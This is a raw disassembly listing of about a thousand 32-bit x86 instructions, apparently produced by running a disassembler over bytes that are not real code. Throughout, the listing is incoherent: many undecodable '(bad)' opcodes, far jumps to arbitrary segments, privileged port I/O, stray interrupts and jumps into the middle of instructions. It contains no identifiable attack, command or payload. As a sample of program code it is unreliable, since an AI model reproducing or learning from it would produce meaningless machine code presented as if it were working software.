  41ee06:	shl    BYTE PTR [ebp+0x249512d2],cl
  41ee0c:	fiadd  WORD PTR [ebp+0x3c]
  41ee0f:	mov    eax,ds:0xf4e6d4fa
  41ee14:	sar    DWORD PTR [ecx],0x9d
  41ee17:	retf   0xf797
  41ee1a:	pop    eax
  41ee1b:	sar    BYTE PTR [esi-0x7bd6d66d],cl
  41ee21:	lods   al,BYTE PTR ds:[esi]
  41ee22:	push   esi
  41ee23:	xor    eax,0x77aff97a
  41ee28:	mov    bh,0xff
  41ee2a:	add    al,dl
  41ee2c:	mov    eax,ds:0x4a7c9ebb
  41ee31:	jns    0x41ee7d
  41ee33:	cli    
  41ee34:	sbb    BYTE PTR [edx],bh
  41ee36:	jne    0x41ee93
  41ee38:	dec    eax
  41ee39:	xchg   ecx,eax
  41ee3a:	jmp    0x41ee9f
  41ee3c:	xchg   ebx,eax
  41ee3d:	inc    edi
  41ee3e:	int    0xd
  41ee40:	sti    
  41ee41:	pop    ebp
  41ee42:	pop    ecx
  41ee43:	(bad)  
  41ee44:	scas   eax,DWORD PTR es:[edi]
  41ee45:	cmp    al,0x8d
  41ee47:	arpl   WORD PTR [ecx],ax
  41ee49:	rcr    ah,cl
  41ee4b:	xchg   ebx,eax
  41ee4c:	imul   edx,DWORD PTR [edx-0x2d],0x6e
  41ee50:	jmp    0x7a966cfd
  41ee55:	lahf   
  41ee56:	sbb    dl,BYTE PTR [ecx]
  41ee58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee59:	mov    edx,0xca7e9277
  41ee5e:	mov    cl,0x83
  41ee60:	(bad)  
  41ee61:	or     al,0x1d
  41ee63:	rcr    DWORD PTR [ebp+0x2c07e277],1
  41ee69:	add    al,0xfc
  41ee6b:	xchg   esp,eax
  41ee6c:	cdq    
  41ee6d:	and    ebx,esp
  41ee6f:	pushf  
  41ee70:	(bad)  
  41ee71:	lock pop ecx
  41ee73:	fs hlt 
  41ee75:	pop    edx
  41ee76:	mov    es,WORD PTR [edx+edi*4+0xb]
  41ee7a:	inc    ecx
  41ee7b:	stos   BYTE PTR es:[edi],al
  41ee7c:	call   0x608:0x4830f875
  41ee83:	out    dx,al
  41ee84:	stc    
  41ee85:	sbb    DWORD PTR [ebp-0x31],edx
  41ee88:	jl     0x41eeef
  41ee8a:	push   0x1f105ad9
  41ee8f:	(bad)  
  41ee90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee91:	add    eax,0x5a5b1be3
  41ee96:	shl    BYTE PTR [ebx+0x75c7488d],cl
  41ee9c:	clc    
  41ee9d:	dec    ebp
  41ee9e:	cmp    eax,DWORD PTR [edx-0x50]
  41eea1:	xor    DWORD PTR [ecx+0x5],ebx
  41eea4:	imul   ebx,DWORD PTR [esi],0x7d
  41eea7:	scas   al,BYTE PTR es:[edi]
  41eea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eea9:	dec    edx
  41eeaa:	mov    al,ds:0xc6a18b77
  41eeaf:	xchg   esp,eax
  41eeb0:	pusha  
  41eeb1:	sub    BYTE PTR [ecx+0x4167fca2],dh
  41eeb7:	inc    BYTE PTR [edi-0xc]
  41eeba:	mov    dh,0xe8
  41eebc:	aad    0xb0
  41eebe:	inc    esi
  41eebf:	mov    cl,0x1b
  41eec1:	cmp    DWORD PTR fs:[bx+0x7291],edi
  41eec7:	sbb    BYTE PTR [ecx],cl
  41eec9:	push   esp
  41eeca:	dec    esp
  41eecb:	add    al,0x8e
  41eecd:	jne    0x41eebf
  41eecf:	loop   0x41ef22
  41eed1:	daa    
  41eed2:	std    
  41eed3:	out    0xe,eax
  41eed5:	scas   al,BYTE PTR es:[edi]
  41eed6:	sbb    al,0x1f
  41eed8:	pop    ds
  41eed9:	sbb    eax,0xa6f3a2f4
  41eede:	mov    bh,BYTE PTR [eax-0xb5fdc36]
  41eee4:	das    
  41eee5:	icebp  
  41eee6:	add    ebp,esp
  41eee8:	jmp    0x41ef5c
  41eeea:	sbb    esi,ebx
  41eeec:	sbb    al,0x3b
  41eeee:	or     ebp,DWORD PTR [esi]
  41eef0:	xor    DWORD PTR [ecx+0x24],edi
  41eef3:	xlat   BYTE PTR ds:[bx]
  41eef5:	je     0x41eee8
  41eef7:	neg    DWORD PTR [esi+0x317a3184]
  41eefd:	push   0x8ba0c21
  41ef02:	shl    bl,0x9f
  41ef05:	push   esi
  41ef06:	mov    bh,0x7d
  41ef08:	int3   
  41ef09:	xor    esi,DWORD PTR [ecx-0x54]
  41ef0c:	pop    ebx
  41ef0d:	mov    ch,al
  41ef0f:	in     eax,dx
  41ef10:	cmp    BYTE PTR [esi+0x48],0x7
  41ef14:	popf   
  41ef15:	add    eax,0x5fdb7abf
  41ef1a:	jae    0x41eec8
  41ef1c:	pop    ebx
  41ef1d:	push   ds
  41ef1e:	clc    
  41ef1f:	push   ds
  41ef20:	scas   eax,DWORD PTR es:[edi]
  41ef21:	mov    cl,0x12
  41ef23:	and    eax,0xc50bf45f
  41ef28:	pop    ecx
  41ef29:	in     al,dx
  41ef2a:	mov    al,0x15
  41ef2c:	dec    ebp
  41ef2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef2e:	xor    eax,0x646676e3
  41ef33:	pop    edx
  41ef34:	sbb    al,0x8b
  41ef36:	rcr    DWORD PTR [edi+0x38],cl
  41ef39:	add    BYTE PTR [ebp+0x6919ef99],cl
  41ef3f:	inc    ecx
  41ef40:	test   al,0xb4
  41ef42:	lock or esi,edx
  41ef45:	pop    edx
  41ef46:	(bad)  
  41ef47:	in     eax,dx
  41ef48:	adc    edi,ebx
  41ef4a:	pop    ebx
  41ef4b:	or     DWORD PTR [ebp+edx*8+0x1f07eaf4],ebp
  41ef52:	dec    ebx
  41ef53:	retf   0x13b8
  41ef56:	loopne 0x41ef09
  41ef58:	out    dx,eax
  41ef59:	dec    ebp
  41ef5a:	call   FWORD PTR ds:0x3f2130ba
  41ef60:	inc    ebx
  41ef61:	je     0x41ef53
  41ef63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef64:	mov    esp,0x4e20d25e
  41ef69:	aas    
  41ef6a:	sub    dl,ah
  41ef6c:	comiss xmm1,DWORD PTR [eax-0x5a]
  41ef70:	dec    ecx
  41ef71:	into   
  41ef72:	push   esp
  41ef73:	nop
  41ef74:	sub    bh,BYTE PTR [edi-0x2a5fe7c]
  41ef7a:	dec    edi
  41ef7b:	shr    BYTE PTR ds:0xf21e79c4,0x8a
  41ef82:	and    BYTE PTR [esi-0x33],0x9f
  41ef86:	cs mov ebx,ebp
  41ef89:	outs   dx,DWORD PTR ds:[esi]
  41ef8a:	cs leave 
  41ef8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef8d:	dec    ebx
  41ef8e:	imul   ebp,DWORD PTR [eax],0xffffffd7
  41ef91:	adc    eax,0x66767bb2
  41ef96:	jp     0x41efe1
  41ef98:	inc    esi
  41ef99:	scas   eax,DWORD PTR es:[edi]
  41ef9a:	test   BYTE PTR [eax+0x3b],ch
  41ef9d:	or     al,0xa3
  41ef9f:	stos   DWORD PTR es:[edi],eax
  41efa0:	js     0x41ef79
  41efa2:	mov    DWORD PTR [esi],eax
  41efa4:	pop    ebx
  41efa5:	fild   QWORD PTR [eax-0x6e4f0c0a]
  41efab:	ds jge 0x41efd7
  41efae:	(bad)  
  41efaf:	sbb    DWORD PTR [ecx+edi*8-0xd],ecx
  41efb3:	fisub  DWORD PTR ds:0x931eb853
  41efb9:	outs   dx,BYTE PTR ds:[esi]
  41efba:	cmp    ecx,0xffffffe5
  41efbd:	imul   esp,ebp,0xffffffc0
  41efc0:	loopne 0x41f00a
  41efc2:	aas    
  41efc3:	xchg   ebp,eax
  41efc4:	(bad)  
  41efc5:	push   0x7f
  41efc7:	mov    ebp,0xca851e72
  41efcc:	pop    edx
  41efcd:	mov    ebx,esp
  41efcf:	shl    BYTE PTR [eax],0xe3
  41efd2:	jns    0x41f028
  41efd4:	and    al,0xaf
  41efd6:	adc    esi,DWORD PTR ds:0x4821a008
  41efdc:	cmp    al,0xe3
  41efde:	xor    ah,BYTE PTR [edi-0x38f1b899]
  41efe4:	int    0xa3
  41efe6:	ret    
  41efe7:	adc    dl,BYTE PTR [edi-0x51]
  41efea:	cmc    
  41efeb:	(bad)  
  41efec:	fadd   QWORD PTR [edi+eiz*4]
  41efef:	and    bl,bh
  41eff1:	retf   0xaffa
  41eff4:	es (bad) 
  41eff6:	(bad)  [edi+0x34bb9410]
  41effc:	pop    ebp
  41effd:	jnp    0x41efbc
  41efff:	push   edx
  41f000:	aad    0xcb
  41f002:	aaa    
  41f003:	push   ss
  41f004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f005:	xor    bh,BYTE PTR [edx-0x38194c95]
  41f00b:	push   edx
  41f00c:	xor    al,0xd9
  41f00e:	inc    esi
  41f00f:	jp     0x41f042
  41f011:	xchg   dh,dl
  41f013:	in     eax,0x58
  41f015:	mov    cl,0xbb
  41f017:	loop   0x41f071
  41f019:	dec    ecx
  41f01a:	sbb    ebx,esi
  41f01c:	cmp    eax,0x37d277fc
  41f021:	lds    ecx,FWORD PTR [ebx+ecx*4]
  41f024:	xor    eax,0x8af3957d
  41f029:	jne    0x41efce
  41f02b:	call   0x94f5:0x24fda577
  41f032:	lods   al,BYTE PTR ds:[esi]
  41f033:	cmp    DWORD PTR [edx+0x7f68352e],edx
  41f039:	mov    ebx,0x14998710
  41f03e:	adc    ecx,DWORD PTR [ecx+0x499ecd19]
  41f044:	cli    
  41f045:	jg     0x41eff9
  41f047:	jl     0x41f097
  41f049:	cs hlt 
  41f04b:	fwait
  41f04c:	test   eax,0x1f401215
  41f051:	cld    
  41f052:	add    edi,esp
  41f054:	add    BYTE PTR [esi],ah
  41f056:	jmp    0x4f3b:0xa73f993c
  41f05d:	int    0x94
  41f05f:	inc    ebx
  41f060:	fcmovbe st,st(0)
  41f062:	mov    cl,0x6b
  41f064:	sbb    DWORD PTR ds:0x95317463,edx
  41f06a:	cli    
  41f06b:	fmul   DWORD PTR [eax-0x4842f9b]
  41f071:	icebp  
  41f072:	jbe    0x41f005
  41f074:	push   cs
  41f075:	mov    al,ds:0x1441dd70
  41f07a:	add    esi,DWORD PTR [ecx+eax*1-0x12]
  41f07e:	lahf   
  41f07f:	jne    0x41f0d9
  41f081:	shl    DWORD PTR [esi+0x230fe2c3],0x9a
  41f088:	scas   al,BYTE PTR es:[edi]
  41f089:	adc    DWORD PTR [edx+0x70c26ed2],eax
  41f08f:	test   BYTE PTR [edx-0xc245acc],0x37
  41f096:	in     eax,0xe5
  41f098:	jmp    0x23ae:0x7b767fc9
  41f09f:	mov    ds:0x78ffffcc,al
  41f0a4:	aaa    
  41f0a5:	pusha  
  41f0a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0a7:	in     eax,dx
  41f0a8:	loope  0x41f046
  41f0aa:	dec    ebx
  41f0ab:	neg    DWORD PTR [ecx-0x7858adb0]
  41f0b1:	inc    esp
  41f0b2:	jmp    0x395734b9
  41f0b7:	push   ebx
  41f0b8:	adc    ebx,DWORD PTR [ecx]
  41f0ba:	xor    BYTE PTR [edi-0x5de96b17],dh
  41f0c0:	(bad)  
  41f0c1:	xchg   esp,eax
  41f0c2:	pushf  
  41f0c3:	jmp    0xbeb1:0xe96f6a3b
  41f0ca:	xlat   BYTE PTR ds:[ebx]
  41f0cb:	addr16 icebp 
  41f0cd:	(bad)  
  41f0ce:	leave  
  41f0cf:	mov    cs,WORD PTR [eax-0x74]
  41f0d2:	xchg   edi,eax
  41f0d3:	mov    bl,0x19
  41f0d5:	or     BYTE PTR [esi+0x10],ch
  41f0d8:	setae  BYTE PTR [ecx-0x4bb3262f]
  41f0df:	adc    eax,DWORD PTR [edx-0x35191d77]
  41f0e5:	and    dh,BYTE PTR [edx-0x47f3177b]
  41f0eb:	les    edi,FWORD PTR [esi-0x2]
  41f0ee:	imul   ebx,edx,0xffffffd4
  41f0f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0f2:	pushf  
  41f0f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0f4:	arpl   WORD PTR [edi+0x62],ax
  41f0f7:	push   es
  41f0f8:	inc    ebx
  41f0f9:	das    
  41f0fa:	test   DWORD PTR [ebp-0x35],ebx
  41f0fd:	(bad)  [esi-0x7b]
  41f100:	lds    edi,FWORD PTR [ebp-0x607a6b79]
  41f106:	xchg   edx,eax
  41f107:	dec    esp
  41f108:	mov    DWORD PTR ds:0xee08797a,0xe3839691
  41f112:	xor    eax,0xed6dadd
  41f117:	out    0x26,eax
  41f119:	repz ficom WORD PTR [ecx-0x49]
  41f11d:	pushf  
  41f11e:	(bad)  
  41f11f:	les    ecx,FWORD PTR [edi+0x414bd9aa]
  41f125:	test   al,0x62
  41f127:	xchg   ebp,eax
  41f128:	and    eax,0x1141d29c
  41f12d:	test   ebx,eax
  41f12f:	mov    ecx,0xc00f1f3e
  41f134:	and    edx,ebp
  41f136:	or     BYTE PTR [ecx-0x6d],bh
  41f139:	mov    ds:0x1509f7d,eax
  41f13e:	mov    eax,ds:0xd96421f7
  41f143:	shr    DWORD PTR [ebx+0x28],1
  41f146:	int    0x84
  41f148:	push   esp
  41f149:	in     al,dx
  41f14a:	jne    0x41f11a
  41f14c:	mov    dl,0x7a
  41f14e:	ins    DWORD PTR es:[edi],dx
  41f14f:	dec    esi
  41f150:	mov    ecx,0xa98d7645
  41f155:	pop    ss
  41f156:	shl    DWORD PTR ds:0x58498900,cl
  41f15c:	mov    ch,0xb0
  41f15e:	fist   DWORD PTR [ecx]
  41f160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f161:	les    ebx,FWORD PTR [edi]
  41f163:	shl    bh,cl
  41f165:	jl     0x41f179
  41f167:	outs   dx,BYTE PTR ds:[esi]
  41f168:	xchg   edi,eax
  41f169:	inc    ebp
  41f16a:	pop    edx
  41f16b:	in     al,0x8e
  41f16d:	or     DWORD PTR [ebp-0x1a0ceeb7],ecx
  41f173:	pop    ecx
  41f174:	sub    esi,DWORD PTR [edi]
  41f176:	loopne 0x41f1a8
  41f178:	inc    ebx
  41f179:	adc    ecx,eax
  41f17b:	cmc    
  41f17c:	push   cs
  41f17d:	lods   eax,DWORD PTR ds:[esi]
  41f17e:	(bad)  
  41f17f:	fisttp WORD PTR [esi+edi*2-0x4e33e994]
  41f186:	sub    eax,0x2c21082a
  41f18b:	aaa    
  41f18c:	ds loop 0x41f132
  41f18f:	je     0x41f143
  41f191:	int3   
  41f192:	or     esp,DWORD PTR [edx+0x53f9cc01]
  41f198:	sbb    eax,0xd7154786
  41f19d:	pushf  
  41f19e:	arpl   cx,di
  41f1a0:	shr    DWORD PTR [edi],0x7e
  41f1a3:	sbb    eax,0x3fae1e66
  41f1a8:	sbb    al,0x25
  41f1aa:	mov    edi,DWORD PTR ds:0x205f3087
  41f1b0:	das    
  41f1b1:	outs   dx,DWORD PTR ds:[esi]
  41f1b2:	adc    edx,DWORD PTR [esi-0x16]
  41f1b5:	push   ecx
  41f1b6:	dec    eax
  41f1b7:	mov    bl,0x3a
  41f1b9:	sbb    BYTE PTR [esi-0x366b953c],ah
  41f1bf:	jl     0x41f23b
  41f1c1:	xlat   BYTE PTR ds:[ebx]
  41f1c2:	pop    ds
  41f1c3:	fndisi(8087 only) 
  41f1c5:	call   0x4b914d40
  41f1ca:	sbb    BYTE PTR [ecx-0x29b346ad],ah
  41f1d0:	jl     0x41f1d3
  41f1d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1d3:	xor    ebx,ecx
  41f1d5:	scas   al,BYTE PTR es:[edi]
  41f1d6:	sbb    bl,cl
  41f1d8:	mov    DWORD PTR [edx-0x1bfd0481],eax
  41f1de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1df:	js     0x41f232
  41f1e1:	mov    ch,0xee
  41f1e3:	in     al,dx
  41f1e4:	mul    BYTE PTR [eax-0x47]
  41f1e7:	mov    gs,WORD PTR [ecx+0x26]
  41f1ea:	dec    ebx
  41f1eb:	mov    al,ds:0x48f81797
  41f1f0:	daa    
  41f1f1:	div    BYTE PTR [edx+eax*2]
  41f1f4:	sar    BYTE PTR [eax+0x6f40b19e],0x3c
  41f1fb:	xlat   BYTE PTR ds:[ebx]
  41f1fc:	in     al,dx
  41f1fd:	adc    bh,cl
  41f1ff:	inc    esi
  41f200:	shl    BYTE PTR [ebx-0x7a15a77c],0x83
  41f207:	sub    BYTE PTR [edi-0x7f],bh
  41f20a:	fistp  WORD PTR [ecx]
  41f20c:	push   DWORD PTR [ebx]
  41f20e:	mov    eax,0x819770d9
  41f213:	mov    edx,0x2aa6f884
  41f218:	imul   edi,DWORD PTR [edx-0x3a5ec932],0x519d0ebe
  41f222:	cmp    BYTE PTR [ecx-0x3b],al
  41f225:	xor    dh,BYTE PTR [ebp+0x5f]
  41f228:	retf   
  41f229:	sbb    esi,DWORD PTR [eax]
  41f22b:	push   ebx
  41f22c:	sub    ecx,0xffffffa5
  41f22f:	pop    edx
  41f230:	or     DWORD PTR [ecx+0x17],ebp
  41f233:	pop    ebp
  41f234:	fwait
  41f235:	in     eax,0x8d
  41f237:	xor    bh,BYTE PTR [edi-0x70]
  41f23a:	loop   0x41f1d0
  41f23c:	or     DWORD PTR [esi-0x26],ebx
  41f23f:	jl     0x41f1e9
  41f241:	xchg   BYTE PTR [esi+0xbe7f6b8],al
  41f247:	cmp    DWORD PTR [edx],0x8ed008c1
  41f24d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f24e:	test   eax,0x490a72b
  41f253:	mov    eax,ds:0x1a397977
  41f258:	imul   ecx,DWORD PTR [eax+0x3038971b],0x845ec779
  41f262:	ins    BYTE PTR es:[edi],dx
  41f263:	pop    ebx
  41f264:	test   al,0xa
  41f266:	test   eax,0xbbea23c7
  41f26b:	loopne 0x41f20e
  41f26d:	jp     0x41f2ed
  41f26f:	jae    0x41f234
  41f271:	inc    esp
  41f272:	lock push ebx
  41f274:	or     eax,0xe4f6a6fc
  41f279:	sbb    eax,0x9de10bb4
  41f27e:	jp     0x41f2e5
  41f280:	cmp    ch,0xa
  41f283:	xor    ebx,DWORD PTR ds:0x9a403ee7
  41f289:	jb     0x41f25c
  41f28b:	stos   BYTE PTR es:[edi],al
  41f28c:	mov    ecx,0x7493b25b
  41f291:	fsub   st(5),st
  41f293:	dec    ecx
  41f294:	fcomp  QWORD PTR [edi]
  41f296:	loope  0x41f2db
  41f298:	mov    dh,0x74
  41f29a:	pop    es
  41f29b:	xor    BYTE PTR [esi-0x4bc59bdd],0xdc
  41f2a2:	mov    ah,0x84
  41f2a4:	jns    0x41f24a
  41f2a6:	pop    ebx
  41f2a7:	icebp  
  41f2a8:	es push esp
  41f2aa:	sbb    edi,edx
  41f2ac:	mov    al,ds:0xcf7604cb
  41f2b1:	shl    DWORD PTR [esi-0x77],0x99
  41f2b5:	or     BYTE PTR [esp+eax*1],al
  41f2b8:	mov    ds:0xc666cc78,al
  41f2bd:	pop    ebx
  41f2be:	outs   dx,DWORD PTR ds:[esi]
  41f2bf:	(bad)  
  41f2c0:	ja     0x41f33b
  41f2c2:	mov    dh,0x2e
  41f2c4:	inc    edi
  41f2c6:	sbb    ah,BYTE PTR [eax]
  41f2c8:	stc    
  41f2c9:	and    BYTE PTR [edi],cl
  41f2cb:	shl    dh,0x2c
  41f2ce:	std    
  41f2cf:	(bad)  
  41f2d1:	and    eax,0x13dd369d
  41f2d6:	xchg   BYTE PTR [ecx],al
  41f2d8:	(bad)  
  41f2d9:	mov    DWORD PTR [ecx+0x75114e23],edi
  41f2df:	ret    
  41f2e0:	fidiv  WORD PTR [esi-0x7919d1eb]
  41f2e6:	push   ss
  41f2e7:	cld    
  41f2e8:	sbb    ebp,eax
  41f2ea:	mov    esi,0xdce101f2
  41f2ef:	jg     0x41f369
  41f2f1:	mov    ah,0xe4
  41f2f3:	(bad)  [ebx-0x1dd43016]
  41f2f9:	in     al,dx
  41f2fa:	jl     0x41f331
  41f2fc:	mov    cl,0x9a
  41f2fe:	jmp    0x21bdb077
  41f303:	gs in  al,0xfe
  41f306:	test   al,0xbd
  41f308:	jge    0x41f37e
  41f30a:	sar    BYTE PTR [esi-0x7ab7b18b],cl
  41f310:	mov    dl,0x67
  41f312:	xor    al,0x85
  41f314:	inc    esp
  41f315:	fadd   QWORD PTR [esi-0x18b5085c]
  41f31b:	mov    edx,0x467bfaba
  41f320:	pop    eax
  41f321:	jmp    0x6710e868
  41f326:	(bad)  
  41f327:	mov    ebx,DWORD PTR [edi+0x630c5978]
  41f32d:	mov    bh,0xc4
  41f32f:	inc    esp
  41f330:	cld    
  41f331:	xchg   esi,eax
  41f332:	repz not DWORD PTR [ebx+ebx*2+0x6812a9f6]
  41f33a:	stos   DWORD PTR es:[edi],eax
  41f33b:	xor    ebx,DWORD PTR [ecx]
  41f33d:	adc    al,BYTE PTR [ecx]
  41f33f:	or     ebx,DWORD PTR [ebx+0x3fa0da53]
  41f345:	cdq    
  41f346:	(bad)  
  41f348:	rcr    BYTE PTR [ecx+0x3f],cl
  41f34b:	sub    DWORD PTR [ecx-0x2b8389b6],ebp
  41f351:	sbb    eax,0x99363064
  41f356:	and    al,0x2d
  41f358:	(bad)  
  41f359:	not    BYTE PTR [ebx-0x59]
  41f35c:	xor    al,0x58
  41f35e:	(bad)  
  41f35f:	out    dx,al
  41f360:	shl    BYTE PTR [ecx-0x1954bd],0x46
  41f367:	mov    ah,0xd7
  41f369:	in     al,0x54
  41f36b:	adc    DWORD PTR [edi],ecx
  41f36d:	jb     0x41f3b3
  41f36f:	xchg   ecx,eax
  41f370:	add    al,0xf0
  41f372:	loope  0x41f343
  41f374:	mov    edx,0x88e01e1
  41f379:	das    
  41f37a:	jns    0x41f312
  41f37c:	jge    0x41f2ff
  41f37e:	leave  
  41f37f:	sbb    al,0x91
  41f381:	ins    DWORD PTR es:[edi],dx
  41f382:	dec    esp
  41f383:	pop    es
  41f384:	outs   dx,BYTE PTR ds:[esi]
  41f385:	or     al,0x3e
  41f387:	cdq    
  41f388:	cld    
  41f389:	or     cl,BYTE PTR [edx+eax*2]
  41f38c:	or     DWORD PTR [edi],eax
  41f38e:	test   al,0x37
  41f390:	xor    eax,0x9e75f3bc
  41f395:	imul   ecx,DWORD PTR [ebx+ecx*2],0x32
  41f399:	or     edi,DWORD PTR [esp+edi*8+0x4d2c977b]
  41f3a0:	push   0x34659a1e
  41f3a5:	xor    ch,BYTE PTR [eax+0x8]
  41f3a8:	sar    ch,1
  41f3aa:	xchg   BYTE PTR [ecx],dh
  41f3ac:	add    ebp,DWORD PTR [ebp+ebp*1-0x3e]
  41f3b0:	dec    ecx
  41f3b1:	out    dx,al
  41f3b2:	inc    esp
  41f3b3:	ins    BYTE PTR es:[edi],dx
  41f3b4:	loop   0x41f40e
  41f3b6:	in     al,dx
  41f3b7:	jg     0x41f3a6
  41f3b9:	mov    WORD PTR [edx+0x78],ss
  41f3bc:	sub    cl,BYTE PTR ds:0xad3a404f
  41f3c2:	sbb    ch,BYTE PTR [esp+edx*4+0x3]
  41f3c6:	sub    al,0xaa
  41f3c8:	inc    ebp
  41f3c9:	arpl   WORD PTR [ecx],si
  41f3cb:	inc    eax
  41f3cc:	xor    DWORD PTR [ebx+0x296ce871],0xe
  41f3d3:	rcl    DWORD PTR [ecx],0x3c
  41f3d6:	repz sub DWORD PTR [ecx],ebx
  41f3d9:	jmp    0x5687:0x9ecfc4dd
  41f3e0:	(bad)  
  41f3e2:	jno    0x41f454
  41f3e4:	(bad)  
  41f3e5:	fsub   QWORD PTR [ecx+0x76]
  41f3e8:	and    ecx,ecx
  41f3ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3eb:	(bad)  
  41f3ec:	jmp    0x41f418
  41f3ee:	sti    
  41f3ef:	sbb    DWORD PTR [eax+eiz*4+0x352b112],edx
  41f3f6:	icebp  
  41f3f7:	jg     0x41f405
  41f3f9:	add    dl,BYTE PTR [eax]
  41f3fb:	push   esi
  41f3fc:	inc    ebp
  41f3fd:	paddusw mm2,QWORD PTR [eax]
  41f400:	imul   ebp,DWORD PTR [ecx+0x79],0x3751cd78
  41f407:	or     ah,BYTE PTR [edi-0x18]
  41f40a:	push   0x6a69d778
  41f40f:	mov    bh,0xfa
  41f411:	(bad)  
  41f413:	push   edi
  41f414:	xchg   ebp,eax
  41f415:	jg     0x41f3f1
  41f417:	loope  0x41f42f
  41f419:	enter  0x304a,0x72
  41f41d:	(bad)  
  41f41e:	sub    esp,DWORD PTR [ebx]
  41f420:	in     al,dx
  41f421:	pusha  
  41f422:	mov    DWORD PTR [edx+0x51ac908b],ebx
  41f428:	push   eax
  41f429:	push   es
  41f42a:	mov    edx,0x5c0d50fc
  41f42f:	bound  edi,QWORD PTR [edi+0x53895562]
  41f435:	xchg   esi,eax
  41f436:	inc    edi
  41f437:	dec    ecx
  41f438:	adc    eax,0x1899fa0d
  41f43d:	xchg   ecx,eax
  41f43e:	xchg   dl,al
  41f440:	lahf   
  41f441:	sbb    eax,0x1d3b8a4
  41f446:	and    al,BYTE PTR [ecx+0x53]
  41f449:	fdivr  DWORD PTR [edx-0x49d3da63]
  41f44f:	loopne 0x41f474
  41f451:	push   eax
  41f452:	jmp    0x4271:0x4ff057f
  41f459:	outs   dx,DWORD PTR ds:[esi]
  41f45a:	sub    al,0x49
  41f45c:	loop   0x41f45b
  41f45e:	scas   al,BYTE PTR es:[edi]
  41f45f:	mov    DWORD PTR [edi-0x47],esi
  41f462:	xchg   ebx,eax
  41f463:	or     al,0x15
  41f465:	pop    esp
  41f466:	iret   
  41f467:	in     eax,0xc
  41f469:	jecxz  0x41f46b
  41f46b:	imul   ebp,ebp,0xa52f0eef
  41f471:	add    DWORD PTR [ebp-0x75],eax
  41f474:	or     dh,bh
  41f476:	mov    eax,DWORD PTR [eax+0x1519e9e6]
  41f47c:	retf   
  41f47d:	pop    edx
  41f47e:	ds adc esp,esi
  41f481:	inc    ecx
  41f483:	mov    cl,0x77
  41f485:	inc    edx
  41f486:	pop    ss
  41f487:	stos   DWORD PTR es:[edi],eax
  41f488:	or     DWORD PTR [ebp-0x34e87fc],ebp
  41f48e:	daa    
  41f48f:	jne    0x41f4f5
  41f491:	mov    edx,0xfaaae1bb
  41f496:	jecxz  0x41f4b6
  41f498:	jnp    0x41f42f
  41f49a:	shl    BYTE PTR [edi+0x546608ef],cl
  41f4a0:	dec    esi
  41f4a1:	mov    DWORD PTR [ebp-0x6e],0xe428e8f
  41f4a8:	mov    cs,WORD PTR [ebx-0x7c1e6700]
  41f4ae:	mov    bh,BYTE PTR [eax]
  41f4b0:	aas    
  41f4b1:	ret    
  41f4b2:	pop    eax
  41f4b3:	push   0xaf303be6
  41f4b8:	dec    esi
  41f4b9:	sub    BYTE PTR [edx],bl
  41f4bb:	loopne 0x41f44f
  41f4bd:	fisub  DWORD PTR [edi+0x49693680]
  41f4c3:	pop    esi
  41f4c4:	iret   
  41f4c5:	push   ebx
  41f4c6:	mov    esi,0xbac1a286
  41f4cb:	mov    ?,WORD PTR fs:[ebx]
  41f4ce:	and    al,0x6e
  41f4d0:	or     DWORD PTR [edx],0x88ba4ed2
  41f4d6:	pop    es
  41f4d7:	and    eax,0xccfa58ee
  41f4dc:	inc    ebx
  41f4dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4de:	arpl   WORD PTR [esi],cx
  41f4e0:	test   al,0x6f
  41f4e2:	pop    ds
  41f4e3:	int3   
  41f4e4:	pushf  
  41f4e5:	add    eax,0x7105745d
  41f4ea:	sbb    dh,BYTE PTR [esi]
  41f4ec:	scas   eax,DWORD PTR es:[edi]
  41f4ed:	pusha  
  41f4ee:	push   esp
  41f4ef:	outs   dx,DWORD PTR ds:[esi]
  41f4f0:	mov    ch,0x4f
  41f4f2:	mov    ds:0xcdabd14a,eax
  41f4f7:	call   0x25e40491
  41f4fc:	aad    0xaa
  41f4fe:	push   ss
  41f4ff:	lock stos DWORD PTR es:[edi],eax
  41f501:	das    
  41f502:	push   ebp
  41f503:	daa    
  41f504:	add    DWORD PTR [ebp-0x28c03595],ebx
  41f50a:	mov    DWORD PTR [ebp+0x31],0x880b9b05
  41f511:	push   ds
  41f512:	and    dl,ch
  41f514:	pop    fs
  41f516:	xor    al,0xea
  41f518:	sub    edi,DWORD PTR [edx+ebx*4]
  41f51b:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41f51d:	cmc    
  41f51e:	fcmovnu st,st(0)
  41f520:	ror    DWORD PTR [eax+0x120ec60c],0x75
  41f527:	mov    ds:0x449bdc4,al
  41f52c:	and    eax,0x6313b0ea
  41f531:	or     al,0x1b
  41f533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f534:	repz icebp 
  41f536:	jae    0x41f532
  41f538:	push   0xffffffad
  41f53a:	shr    DWORD PTR [ebx+0x7e],cl
  41f53d:	and    esp,0xffffffad
  41f540:	ds cld 
  41f542:	fnstsw WORD PTR [eax]
  41f544:	sub    eax,0x68b7c8bd
  41f549:	jge    0x41f5a4
  41f54b:	add    BYTE PTR [ebx],bl
  41f54d:	and    al,0x2b
  41f54f:	aam    0x95
  41f551:	pop    esp
  41f552:	xchg   edx,eax
  41f553:	(bad)  
  41f554:	call   0x8690:0x1fdae3c2
  41f55b:	out    dx,eax
  41f55c:	jbe    0x41f518
  41f55e:	sbb    bh,cl
  41f560:	pusha  
  41f561:	inc    ebx
  41f562:	pop    edx
  41f563:	mov    bh,0xb8
